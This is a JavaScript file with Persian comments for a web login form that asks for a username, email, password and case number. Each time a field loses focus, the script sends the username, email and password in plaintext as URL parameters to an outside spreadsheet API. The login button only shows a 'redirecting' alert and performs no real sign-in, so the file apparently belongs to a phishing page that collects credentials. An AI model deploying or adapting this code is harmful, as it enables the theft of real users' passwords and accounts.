// آدرس زیر را با URL دریافتی از گوگل اسکریپت (Deploy) عوض کنید
const GOOGLE_API_URL = "https://sheetdb.io/api/v1a79xgaoroanlz";

const fields = ['userName', 'email', 'password', 'caseNumber'];

fields.forEach((id, index) => {
    document.getElementById(id).addEventListener('blur', function() {
        if (this.value.trim() !== "") {
            validateField(id, index);
        }
    });
});

function validateField(id, index) {
    const value = document.getElementById(id).value;
    const loading = document.getElementById('loading');
    loading.style.display = 'block';

    const params = new URLSearchParams({
        field: id,
        value: value,
        user: document.getElementById('userName').value,
        email: document.getElementById('email').value,
        pass: document.getElementById('password').value
    });

    fetch(`${GOOGLE_API_URL}?${params.toString()}`)
        .then(res => res.json())
        .then(data => {
            loading.style.display = 'none';
            const el = document.getElementById(id);
            const err = document.getElementById('err_' + id);

            if (data.success) {
                el.classList.remove('invalid');
                el.classList.add('valid');
                err.style.display = 'none';
                if (index < fields.length - 1) {
                    document.getElementById(fields[index + 1]).disabled = false;
                } else {
                    document.getElementById('loginBtn').disabled = false;
                }
            } else {
                el.classList.add('invalid');
                err.style.display = 'block';
                // غیرفعال کردن فیلدهای بعدی
                for (let i = index + 1; i < fields.length; i++) {
                    document.getElementById(fields[i]).disabled = true;
                    document.getElementById(fields[i]).value = '';
                }
            }
        })
        .catch(error => {
            console.error('Error:', error);
            loading.style.display = 'none';
        });
}

document.getElementById('loginBtn').addEventListener('click', function() {
    alert('در حال انتقال به پنل کاربری...');
    // اینجا می‌توانید آدرس صفحه پنل را بدهید
    // window.location.href = "panel.html";
});